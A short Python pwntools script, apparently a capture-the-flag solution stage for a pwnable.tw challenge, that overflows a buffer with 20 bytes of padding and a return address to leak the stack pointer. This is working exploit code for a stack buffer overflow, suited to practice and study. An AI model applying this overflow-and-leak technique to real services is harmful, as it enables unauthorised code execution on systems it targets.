from pwn import *

r = remote('chall.pwnable.tw', 10000)

buf = b"A" * 20 + p32(0x08048087)
r.recvuntil(b'CTF:')
r.send(buf)

esp = u32(r.recv(4))
print(f"[+] ESP is at {hex(esp)}")

r.close()
